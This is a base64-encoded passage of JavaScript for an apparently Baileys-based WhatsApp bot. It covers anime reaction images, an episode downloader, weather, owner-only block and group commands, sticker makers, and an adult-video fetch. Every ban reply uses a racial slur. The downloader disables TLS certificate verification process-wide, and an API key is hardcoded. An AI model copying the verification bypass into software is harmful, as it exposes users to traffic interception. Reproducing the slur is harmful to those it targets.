VIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKIHdhaWZ1ZGQgPSBhd2FpdCBheGlvcy5nZXQoYGh0dHBzOi8vd2FpZnUucGljcy9hcGkvc2Z3L3NtaWxlYCkgICAgICAgCiAgICAgICAgICAgIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IGltYWdlOiB7IHVybDp3YWlmdWRkLmRhdGEudXJsfSAsIGNhcHRpb246IG0uc3VjY2Vzc30sIHsgcXVvdGVkOm0gfSkuY2F0Y2goZXJyID0+IHsKcmV0dXJuKCdFcnJvciEnKQp9KQp9CmJyZWFrOwpjYXNlICdhbmltZXBva2UnOnsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiB3YWlmdWRkID0gYXdhaXQgYXhpb3MuZ2V0KGBodHRwczovL3dhaWZ1LnBpY3MvYXBpL3Nmdy9wb2tlYCkgICAgICAgCiAgICAgICAgICAgIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IGltYWdlOiB7IHVybDp3YWlmdWRkLmRhdGEudXJsfSAsIGNhcHRpb246IG0uc3VjY2Vzc30sIHsgcXVvdGVkOm0gfSkuY2F0Y2goZXJyID0+IHsKcmV0dXJuKCdFcnJvciEnKQp9KQp9CmJyZWFrOwpjYXNlICdhbmltZXdpbmsnOnsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiB3YWlmdWRkID0gYXdhaXQgYXhpb3MuZ2V0KGBodHRwczovL3dhaWZ1LnBpY3MvYXBpL3Nmdy93aW5rYCkgICAgICAgCiAgICAgICAgICAgIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IGltYWdlOiB7IHVybDp3YWlmdWRkLmRhdGEudXJsfSAsIGNhcHRpb246IG0uc3VjY2Vzc30sIHsgcXVvdGVkOm0gfSkuY2F0Y2goZXJyID0+IHsKcmV0dXJuKCdFcnJvciEnKQp9KQp9CmJyZWFrOwpjYXNlICdhbmltZWJvbmsnOnsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiB3YWlmdWRkID0gYXdhaXQgYXhpb3MuZ2V0KGBodHRwczovL3dhaWZ1LnBpY3MvYXBpL3Nmdy9ib25rYCkgICAgICAgCiAgICAgICAgICAgIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IGltYWdlOiB7IHVybDp3YWlmdWRkLmRhdGEudXJsfSAsIGNhcHRpb246IG0uc3VjY2Vzc30sIHsgcXVvdGVkOm0gfSkuY2F0Y2goZXJyID0+IHsKcmV0dXJuKCdFcnJvciEnKQp9KQp9CmJyZWFrOwpjYXNlICdhbmltZWJ1bGx5Jzp7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogd2FpZnVkZCA9IGF3YWl0IGF4aW9zLmdldChgaHR0cHM6Ly93YWlmdS5waWNzL2FwaS9zZncvYnVsbHlgKSAgICAgICAKICAgICAgICAgICAgYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgaW1hZ2U6IHsgdXJsOndhaWZ1ZGQuZGF0YS51cmx9ICwgY2FwdGlvbjogbS5zdWNjZXNzfSwgeyBxdW90ZWQ6bSB9KS5jYXRjaChlcnIgPT4gewpyZXR1cm4oJ0Vycm9yIScpCn0pCn0KYnJlYWs7CmNhc2UgJ2FuaW1leWVldCc6ewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKIHdhaWZ1ZGQgPSBhd2FpdCBheGlvcy5nZXQoYGh0dHBzOi8vd2FpZnUucGljcy9hcGkvc2Z3L3llZXRgKSAgICAgICAKICAgICAgICAgICAgYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgaW1hZ2U6IHsgdXJsOndhaWZ1ZGQuZGF0YS51cmx9ICwgY2FwdGlvbjogbS5zdWNjZXNzfSwgeyBxdW90ZWQ6bSB9KS5jYXRjaChlcnIgPT4gewpyZXR1cm4oJ0Vycm9yIScpCn0pCn0KYnJlYWs7CmNhc2UgJ2FuaW1lYml0ZSc6ewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKIHdhaWZ1ZGQgPSBhd2FpdCBheGlvcy5nZXQoYGh0dHBzOi8vd2FpZnUucGljcy9hcGkvc2Z3L2JpdGVgKSAgICAgICAKICAgICAgICAgICAgYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgaW1hZ2U6IHsgdXJsOndhaWZ1ZGQuZGF0YS51cmx9ICwgY2FwdGlvbjogbS5zdWNjZXNzfSwgeyBxdW90ZWQ6bSB9KS5jYXRjaChlcnIgPT4gewpyZXR1cm4oJ0Vycm9yIScpCn0pCn0KYnJlYWs7CmNhc2UgJ2FuaW1lbGljayc6ewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKIHdhaWZ1ZGQgPSBhd2FpdCBheGlvcy5nZXQoYGh0dHBzOi8vd2FpZnUucGljcy9hcGkvc2Z3L2xpY2tgKSAgICAgICAKICAgICAgICAgICAgYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgaW1hZ2U6IHsgdXJsOndhaWZ1ZGQuZGF0YS51cmx9ICwgY2FwdGlvbjogbS5zdWNjZXNzfSwgeyBxdW90ZWQ6bSB9KS5jYXRjaChlcnIgPT4gewpyZXR1cm4oJ0Vycm9yIScpCn0pCn0KYnJlYWs7CmNhc2UgJ2FuaW1la2lsbCc6ewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKIHdhaWZ1ZGQgPSBhd2FpdCBheGlvcy5nZXQoYGh0dHBzOi8vd2FpZnUucGljcy9hcGkvc2Z3L2tpbGxgKSAgICAgICAKICAgICAgICAgICAgYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgaW1hZ2U6IHsgdXJsOndhaWZ1ZGQuZGF0YS51cmx9ICwgY2FwdGlvbjogbS5zdWNjZXNzfSwgeyBxdW90ZWQ6bSB9KS5jYXRjaChlcnIgPT4gewpyZXR1cm4oJ0Vycm9yIScpCn0pCn0KYnJlYWs7CiBjYXNlICdhbmltZWRsJzogewogaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgICBpZiAoIXEuaW5jbHVkZXMoInwiKSkgewogICAgICAgIHJldHVybiByZXBseSgi8J+TjCAqUGxlYXNlIHByb3ZpZGUgYSB2YWxpZCBhbmltZSBuYW1lIGFuZCBlcGlzb2RlIG51bWJlciEqXG5cbkV4YW1wbGU6IGAuYW5pbWVkbCBTb2xvIExldmVsaW5nIHwgMWAiKTsKICAgIH0KCiAgICB0cnkgewogICAgICAgIGNvbnN0IFthbmltZU5hbWUsIGVwaXNvZGVdID0gcS5zcGxpdCgifCIpLm1hcCh4ID0+IHgudHJpbSgpKTsgCgogICAgICAgIGNvbnN0IGFwaVVybCA9IGBodHRwczovL2RyYWN1bGF6eHkteHl6ZHJhYy5oZi5zcGFjZS9hcGkvQW5pbWVkbD9xPSR7ZW5jb2RlVVJJQ29tcG9uZW50KGFuaW1lTmFtZSl9JmVwPSR7ZW5jb2RlVVJJQ29tcG9uZW50KGVwaXNvZGUpfWA7CgogICAgICAgIHByb2Nlc3MuZW52Lk5PREVfVExTX1JFSkVDVF9VTkFVVEhPUklaRUQgPSAiMCI7IAoKICAgICAgICBjb25zdCB7IGRhdGEgfSA9IGF3YWl0IGF4aW9zLmdldChhcGlVcmwsIHsKICAgICAgICAgICAgaHR0cHNBZ2VudDogbmV3IChyZXF1aXJlKCdodHRwcycpLkFnZW50KSh7IHJlamVjdFVuYXV0aG9yaXplZDogZmFsc2UgfSkKICAgICAgICB9KTsKCiAgICAgICAgaWYgKGRhdGEuU1RBVFVTICE9PSAyMDAgfHwgIWRhdGEuZG93bmxvYWRfbGluaykgewogICAgICAgICAgICByZXR1cm4gcmVwbHkoIuKaoO+4jyAqRmFpbGVkIHRvIHJldHJpZXZlIHRoZSBhbmltZSBlcGlzb2RlISpcblxuUGxlYXNlIGNoZWNrIHRoZSBhbmltZSBuYW1lIGFuZCBlcGlzb2RlIG51bWJlci4iKTsKICAgICAgICB9CgogICAgICAgIGNvbnN0IHsgYW5pbWUsIGVwaXNvZGU6IGVwTnVtYmVyLCBkb3dubG9hZF9saW5rIH0gPSBkYXRhOwoKICAgICAgICBsZXQgbWVzc2FnZSA9IGAK8J+OpSAqQW5pbWUgRm91bmQhKgoK8J+TuiAqTmFtZToqICR7YW5pbWV9CvCfk4wgKkVwaXNvZGU6KiAke2VwTnVtYmVyfQoK8J+TpSAqRG93bmxvYWRpbmcuLi4gUGxlYXNlIHdhaXQhKgo+IEFLQU5FIE1EIERPV05MT0FERVIKICAgICAgICBgLnRyaW0oKTsKCiAgICAgICAgYXdhaXQgcmVwbHkobWVzc2FnZSk7CgogICAgCiAgICAgICAgYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKICAgICAgICAgICAgZG9jdW1lbnQ6IHsgdXJsOiBkb3dubG9hZF9saW5rIH0sCiAgICAgICAgICAgIG1pbWV0eXBlOiAidmlkZW8vbXA0IiwKICAgICAgICAgICAgZmlsZU5hbWU6IGAke2FuaW1lfSAtIEVwaXNvZGUgJHtlcE51bWJlcn0ubXA0YAogICAgICAgIH0sIHsgcXVvdGVkOiBtIH0pOwoKICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgY29uc29sZS5lcnJvcigi4p2MIEFuaW1lIERvd25sb2FkZXIgRXJyb3I6IiwgZXJyb3IubWVzc2FnZSk7CiAgICAgICAgcmVwbHkoIuKaoO+4jyAqU2VydmVyIEVycm9yISpcblxuUGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4iKTsKICAgIH0KfQpicmVhazsKIGNhc2UgJ3dlYXRoZXInOnsKIGlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwppZiAoIXRleHQpIHJldHVybiByZXBseSgnV2hhdCBsb2NhdGlvbj8nKQogICAgICAgICAgICBsZXQgd2RhdGEgPSBhd2FpdCBheGlvcy5nZXQoCiAgICAgICAgICAgICAgICBgaHR0cHM6Ly9hcGkub3BlbndlYXRoZXJtYXAub3JnL2RhdGEvMi41L3dlYXRoZXI/cT0ke3RleHR9JnVuaXRzPW1ldHJpYyZhcHBpZD0wNjBhNmJjZmExOTgwOWMyY2Q0ZDk3YTIxMmIxOTI3MyZsYW5ndWFnZT1lbmAKICAgICAgICAgICAgKTsKICAgICAgICAgICAgbGV0IHRleHR3ID0gIiIKICAgICAgICAgICAgdGV4dHcgKz0gYCrwn5e677iPV2VhdGhlciBvZiAgJHt0ZXh0fSpcblxuYAogICAgICAgICAgICB0ZXh0dyArPSBgKldlYXRoZXI6LSogJHt3ZGF0YS5kYXRhLndlYXRoZXJbMF0ubWFpbn1cbmAKICAgICAgICAgICAgdGV4dHcgKz0gYCpEZXNjcmlwdGlvbjotKiAke3dkYXRhLmRhdGEud2VhdGhlclswXS5kZXNjcmlwdGlvbn1cbmAKICAgICAgICAgICAgdGV4dHcgKz0gYCpBdmcgVGVtcDotKiAke3dkYXRhLmRhdGEubWFpbi50ZW1wfVxuYAogICAgICAgICAgICB0ZXh0dyArPSBgKkZlZWxzIExpa2U6LSogJHt3ZGF0YS5kYXRhLm1haW4uZmVlbHNfbGlrZX1cbmAKICAgICAgICAgICAgdGV4dHcgKz0gYCpQcmVzc3VyZTotKiAke3dkYXRhLmRhdGEubWFpbi5wcmVzc3VyZX1cbmAKICAgICAgICAgICAgdGV4dHcgKz0gYCpIdW1pZGl0eTotKiAke3dkYXRhLmRhdGEubWFpbi5odW1pZGl0eX1cbmAKICAgICAgICAgICAgdGV4dHcgKz0gYCpIdW1pZGl0eTotKiAke3dkYXRhLmRhdGEud2luZC5zcGVlZH1cbmAKICAgICAgICAgICAgdGV4dHcgKz0gYCpMYXRpdHVkZTotKiAke3dkYXRhLmRhdGEuY29vcmQubGF0fVxuYAogICAgICAgICAgICB0ZXh0dyArPSBgKkxvbmdpdHVkZTotKiAke3dkYXRhLmRhdGEuY29vcmQubG9ufVxuYAogICAgICAgICAgICB0ZXh0dyArPSBgKkNvdW50cnk6LSogJHt3ZGF0YS5kYXRhLnN5cy5jb3VudHJ5fVxuYAoKICAgICAgICAgICByaWNoLnNlbmRNZXNzYWdlKAogICAgICAgICAgICAgICAgbS5jaGF0LCB7CiAgICAgICAgICAgICAgICAgICAgdGV4dDogdGV4dHcsCiAgICAgICAgICAgICAgICB9LCB7CiAgICAgICAgICAgICAgICAgICAgcXVvdGVkOiBtLAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICkKICAgICAgICAgICB9CiAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgY2FzZSAnY3J5JzogY2FzZSAna2lsbCc6IGNhc2UgJ2h1Zyc6IGNhc2UgJ3BhdCc6IGNhc2UgJ2xpY2snOiAKY2FzZSAna2lzcyc6IGNhc2UgJ2JpdGUnOiBjYXNlICd5ZWV0JzogY2FzZSAnYnVsbHknOiBjYXNlICdib25rJzoKY2FzZSAnd2luayc6IGNhc2UgJ3Bva2UnOiBjYXNlICdub20nOiBjYXNlICdzbGFwJzogY2FzZSAnc21pbGUnOiAKY2FzZSAnd2F2ZSc6IGNhc2UgJ2F3b28nOiBjYXNlICdibHVzaCc6IGNhc2UgJ3NtdWcnOiBjYXNlICdnbG9tcCc6IApjYXNlICdoYXBweSc6IGNhc2UgJ2RhbmNlJzogY2FzZSAnY3JpbmdlJzogY2FzZSAnY3VkZGxlJzogY2FzZSAnaGlnaGZpdmUnOiAKY2FzZSAnc2hpbm9idSc6IGNhc2UgJ2hhbmRob2xkJzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKYXhpb3MuZ2V0KGBodHRwczovL2FwaS53YWlmdS5waWNzL3Nmdy8ke2NvbW1hbmR9YCkKLnRoZW4oKHtkYXRhfSkgPT4gewpyaWNoLnNlbmRJbWFnZUFzU3RpY2tlcihmcm9tLCBkYXRhLnVybCwgbSwgeyBwYWNrbmFtZTogZ2xvYmFsLnBhY2tuYW1lLCBhdXRob3I6IGdsb2JhbC5hdXRob3IgfSkKfSkKfQpicmVhazsKY2FzZSAndW5ibG9jayc6IGNhc2UgJ3VuYmxvY2tlZCc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CgkgaWYgKCFpc0NyZWF0b3IpIHJldHVybiBtLnJlcGx5KCJgYGBmb3IgT3duZXIgb25seWBgYC4iKTsKCQlsZXQgdXNlcnMgPSBtLm1lbnRpb25lZEppZFswXSA/IG0ubWVudGlvbmVkSmlkWzBdIDogbS5xdW90ZWQgPyBtLnF1b3RlZC5zZW5kZXIgOiB0ZXh0LnJlcGxhY2UoL1teMC05XS9nLCAnJykrJ0BzLndoYXRzYXBwLm5ldCcKCQlhd2FpdCByaWNoLnVwZGF0ZUJsb2NrU3RhdHVzKHVzZXJzLCAndW5ibG9jaycpCgkJYXdhaXQgcmVwbHkoYERvbmVgKQoJfQoJYnJlYWs7CgljYXNlICdibG9jayc6IGNhc2UgJ2Jsb2NrZWQnOiB7CglpZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKCSBpZiAoIWlzQ3JlYXRvcikgcmV0dXJuIG0ucmVwbHkoImBgYGZvciBPd25lciBvbmx5YGBgLiIpOwoJCWxldCB1c2VycyA9IG0ubWVudGlvbmVkSmlkWzBdID8gbS5tZW50aW9uZWRKaWRbMF0gOiBtLnF1b3RlZCA/IG0ucXVvdGVkLnNlbmRlciA6IHRleHQucmVwbGFjZSgvW14wLTldL2csICcnKSsnQHMud2hhdHNhcHAubmV0JwoJCWF3YWl0IHJpY2gudXBkYXRlQmxvY2tTdGF0dXModXNlcnMsICdibG9jaycpCgkJYXdhaXQgcmVwbHkoYERvbmVgKQoJCQl9CglicmVhazsKY2FzZSAnY3JlYXRlZ2MnOiBjYXNlICdjcmVhdGVncm91cCc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiBpZiAoIWlzQ3JlYXRvcikgcmV0dXJuIG0ucmVwbHkoImBgYGZvciBPd25lciBvbmx5YGBgLiIpOwppZiAoIWFyZ3Muam9pbigiICIpKSByZXR1cm4gcmVwbHkoYFVzZSAke3ByZWZpeCtjb21tYW5kfSBncm91cG5hbWVgKQp0cnkgewpsZXQgY3JldCA9IGF3YWl0IHJpY2guZ3JvdXBDcmVhdGUoYXJncy5qb2luKCIgIiksIFtdKQpsZXQgcmVzcG9uc2UgPSBhd2FpdCByaWNoLmdyb3VwSW52aXRlQ29kZShjcmV0LmlkKQp0ZWtzID0gYCDjgIwgQ3JlYXRlIEdyb3VwIOOAjQrilrggTmFtZSA6ICR7Y3JldC5zdWJqZWN0fQrilrggT3duZXIgOiBAJHtjcmV0Lm93bmVyLnNwbGl0KCJAIilbMF19CuKWuCBDcmVhdGlvbiA6ICR7bW9tZW50KGNyZXQuY3JlYXRpb24gKiAxMDAwKS50eigiQWZyaWNhL0xhZ29zIikuZm9ybWF0KCJERC9NTS9ZWVlZIEhIOm1tOnNzIil9CgpodHRwczovL2NoYXQud2hhdHNhcHAuY29tLyR7cmVzcG9uc2V9CiAgYApyaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyB0ZXh0OnRla3MsIG1lbnRpb25zOiBhd2FpdCByaWNoLnBhcnNlTWVudGlvbih0ZWtzKX0sIHtxdW90ZWQ6bX0pCn0gY2F0Y2ggewpyZXBseSgiZG9uZSBjaGVjayEiKQp9Cn0KYnJlYWs7CmNhc2UgJ2JyYXQnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogICAgICAgICAgICBpZiAoIXEpIHJldHVybiByZXBseShgU2VuZCBjb21tYW5kIHdpdGggdGV4dC4gJHtwcmVmaXggKyBjb21tYW5kfSByaWNoYCkKICAgICAgICAgICAgY29uc3QgaW1hZ2VVcmwgPSBgaHR0cHM6Ly9icmF0LmNhbGlwaGRldi5jb20vYXBpL2JyYXQ/dGV4dD0ke3F9YAogICAgICAgICAgICBhd2FpdCBtYWtlU3RpY2tlckZyb21VcmwoaW1hZ2VVcmwsIHJpY2gsIG0pOwogICAgICAgIH0KICAgICAgIGJyZWFrOwogIGNhc2UgJ2Z1cmJyYXQnOiB7CiAgaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgICAgICAgICAgIGlmICghcSkgcmV0dXJuIHJlcGx5KGBTZW5kIGNvbW1hbmQgd2l0aCB0ZXh0LiAke3ByZWZpeCArIGNvbW1hbmR9IHJpY2hgKQogICAgICAgICAgICBjb25zdCBpbWFnZVVybCA9IGBodHRwczovL2Zhc3RyZXN0YXBpcy5mYXN0dXJsLmxpbmsvdG9vbC9mdXJicmF0P3RleHQ9JHtxfWAKICAgICAgICAgICAgYXdhaXQgbWFrZVN0aWNrZXJGcm9tVXJsKGltYWdlVXJsLCByaWNoLCBtKTsKICAgICAgICB9CiAgICAgICBicmVhazsKY2FzZSAndG91cmwnOiB7ICAgIAppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICAgIGxldCBxID0gbS5xdW90ZWQgPyBtLnF1b3RlZCA6IG07CiAgICBpZiAoIXEgfHwgIXEuZG93bmxvYWQpIHJldHVybiBtLnJlcGx5KGBSZXBseSB0byBhbiBJbWFnZSBvciBWaWRlbyB3aXRoIGNvbW1hbmQgJHtwcmVmaXggKyBjb21tYW5kfWApOwogICAgCiAgICBsZXQgbWltZSA9IHEubWltZXR5cGUgfHwgJyc7CiAgICBpZiAoIS9pbWFnZVwvKHBuZ3xqcGU/Z3xnaWYpfHZpZGVvXC9tcDQvLnRlc3QobWltZSkpIHsKICAgICAgICByZXR1cm4gcmVwbHkoJ09ubHkgaW1hZ2VzIG9yIE1QNCB2aWRlb3MgYXJlIHN1cHBvcnRlZCEnKTsKICAgIH0KCiAgICBsZXQgbWVkaWE7CiAgICB0cnkgewogICAgICAgIG1lZGlhID0gYXdhaXQgcS5kb3dubG9hZCgpOwogICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICByZXR1cm4gcmVwbHkoJ0ZhaWxlZCB0byBkb3dubG9hZCBtZWRpYSEnKTsKICAgIH0KCiAgICBjb25zdCB1cGxvYWRJbWFnZSA9IHJlcXVpcmUoJy4uL3N5c3RlbS9EYXRhNicpOwogICAgY29uc3QgdXBsb2FkRmlsZSA9IHJlcXVpcmUoJy4uL3N5c3RlbS9EYXRhNycpOwogICAgbGV0IGlzVGVsZSA9IC9pbWFnZVwvKHBuZ3xqcGU/Z3xnaWYpfHZpZGVvXC9tcDQvLnRlc3QobWltZSk7CiAgICBsZXQgbGluazsKICAgIHRyeSB7CiAgICAgICAgbGluayA9IGF3YWl0IChpc1RlbGUgPyB1cGxvYWRJbWFnZSA6IHVwbG9hZEZpbGUpKG1lZGlhKTsKICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgcmV0dXJuIHJlcGx5KCdGYWlsZWQgdG8gdXBsb2FkIG1lZGlhIScpOwogICAgfQoKICAgIHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7CiAgICAgICAgdGV4dDogYFtcYFxgXGBIRVJFIElTIFRIRSBVUkwgQlkgQUtBTkUgTURdXGBcYFxgIFxuKsKpUklDSElFKiBcbiAke2xpbmt9YAogICAgfSwgeyBxdW90ZWQ6IG0gfSk7Cn0KYnJlYWs7CiAKICAgICAgICAgICBjYXNlICd3YWlmdSc6IHsKICAgICAgICAgICBpZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKIHJlcGx5Z2MobWVzcy53YWl0KQphd2FpdCBzbGVlcCgxMDApOwogICAgICAgICAgICBsZXQgYmFzZVVybCA9ICdodHRwczovL3dlZWItYXBpLnZlcmNlbC5hcHAvJwogICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKGJhc2VVcmwgKyBjb21tYW5kKQogICAgICBjb25zdCBpbWFnZUJ1ZmZlciA9IGF3YWl0IHJlc3BvbnNlLmJ1ZmZlcigpIC8vIEdldCB0aGUgaW1hZ2UgZGF0YSBhcyBhIGJ1ZmZlcgogICAgICByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwge2ltYWdlOiAgaW1hZ2VCdWZmZXIsIGNhcHRpb246IGAq4oCiUmFuZG9tICR7Y29tbWFuZH0hKiDwn4CEYH0sIHtxdW90ZWQ6IG19KSAgICAKICAgICAgICAgICAgfQogICAgICAgICAgICBicmVhawogICAgICAgICAgIGNhc2UnbnNmdyc6IHsKICAgICAgICAgICBpZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICB0cnkgewoKICAgIGNvbnN0IGFwaVVybCA9ICdodHRwczovL2FwaS1peC14aS5oZi5zcGFjZS9hcGkvaGVudGFpJzsKICAgIGNvbnNvbGUubG9nKCJBUEkgVVJMOiIsIGFwaVVybCk7CgogICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaChhcGlVcmwpOwoKICAgIGlmICghcmVzcG9uc2Uub2spIHsKICAgICAgICBjb25zb2xlLmVycm9yKGBIVFRQIGVycm9yISBTdGF0dXM6ICR7cmVzcG9uc2Uuc3RhdHVzfWApOwogICAgICAgIHRocm93IG5ldyBFcnJvcihgSFRUUCBlcnJvciEgU3RhdHVzOiAke3Jlc3BvbnNlLnN0YXR1c31gKTsKICAgIH0KICAgIGNvbnN0IGNvbnRlbnRUeXBlID0gcmVzcG9uc2UuaGVhZGVycy5nZXQoJ0NvbnRlbnQtVHlwZScpOwogICAgY29uc29sZS5sb2coIkNvbnRlbnQtVHlwZToiLCBjb250ZW50VHlwZSk7CgogICAgaWYgKCFjb250ZW50VHlwZSB8fCAhY29udGVudFR5cGUuaW5jbHVkZXMoJ2FwcGxpY2F0aW9uL2pzb24nKSkgewogICAgICAgIGNvbnN0IHRleHQgPSBhd2FpdCByZXNwb25zZS50ZXh0KCk7CiAgICAgICAgY29uc29sZS5lcnJvcigiUmVjZWl2ZWQgbm9uLUpTT04gcmVzcG9uc2U6IiwgdGV4dCk7CiAgICAgICAgdGhyb3cgbmV3IEVycm9yKGBFeHBlY3RlZCBKU09OLCBidXQgcmVjZWl2ZWQ6ICR7Y29udGVudFR5cGUgfHwgJ25vIENvbnRlbnQtVHlwZSd9LiAgUmF3IHJlc3BvbnNlOiAke3RleHR9YCk7CiAgICB9CgogICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTsKCiAgICBpZiAoZGF0YSAmJiBkYXRhLnZpZGVvVXJsKSB7CiAgICAgIGNvbnN0IHZpZGVvVXJsID0gZGF0YS52aWRlb1VybDsKICAgICAgY29uc3QgdGl0bGUgPSBkYXRhLnRpdGxlOwogICAgICBjb25zdCBkZXNjcmlwdGlvbiA9IGRhdGEuZGVzY3JpcHRpb247CiAgICAgIGNvbnN0IHJlc29sdXRpb24gPSBkYXRhLnJlc29sdXRpb247CiAgICAgIGNvbnN0IHRodW1ibmFpbFVybCA9IGRhdGEudGh1bWJuYWlsVXJsOwoKICAgICAgY29uc3QgYXBpVGV4dCA9IGAKLSAgKlZpZGVvIFRpdGxlOiogJHt0aXRsZX1cbgotICAqVmlkZW8gRGVzY3JpcHRpb246KiAke2Rlc2NyaXB0aW9ufVxuCi0gICpSZXNvbHV0aW9uOiogXyR7cmVzb2x1dGlvbn1fCmA7CgogICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKAogICAgICAgIG0uY2hhdCwKICAgICAgICB7CiAgICAgICAgICB2aWRlbzogeyB1cmw6IHZpZGVvVXJsIH0sCiAgICAgICAgICBjYXB0aW9uOiBhcGlUZXh0LAogICAgICAgICAgZm9vdGVyOiAnSGVudGFpIGlzIGEgYWR1bHQgY29udGVudCwgeW91IGhhdmUgYmVlbiB3YXJuZWQnLCAvLyBBZGljaW9uYSBhdmlzbyBzb2JyZSBvIGNvbnRlw7pkbwogICAgICAgIH0sCiAgICAgICAgeyBxdW90ZWQ6IG0gfQogICAgICApOwogICAgfSBlbHNlIHsKICAgICAgY29uc29sZS53YXJuKCJwcmVtaXVtLWhlbnRhaTogTm8gdmlkZW8gVVJMIHJlY2VpdmVkIGZyb20gQVBJIG9yIGRhdGEgaXMgbWlzc2luZy4iKTsKICAgICAgYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgdGV4dDogIkNvdWxkIG5vdCByZXRyaWV2ZSBwcmVtaXVtIGNvbnRlbnQuIFBsZWFzZSB0cnkgYWdhaW4gbGF0ZXIuIiB9LCB7IHF1b3RlZDogbSB9KTsKICAgIH0KICB9IGNhdGNoIChlcnJvcikgewogICAgY29uc29sZS5lcnJvcigiRXJyb3IgZHVyaW5nIHByZW1pdW0gaGVudGFpIHJldHJpZXZhbDoiLCBlcnJvcik7CiAgICBhd2FpdCBjb25uLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyB0ZXh0OiBgQW4gZXJyb3Igb2NjdXJyZWQgd2hpbGUgcmV0cmlldmluZyBwcmVtaXVtIGNvbnRlbnQuIFBsZWFzZSB0cnkgYWdhaW4gbGF0ZXIuIEVycm9yOiAke2Vycm9yLm1lc3NhZ2V9YCB9LCB7IHF1b3RlZDogbSB9KTsKICB9CiAgfQogIGJyZWFrOwogIG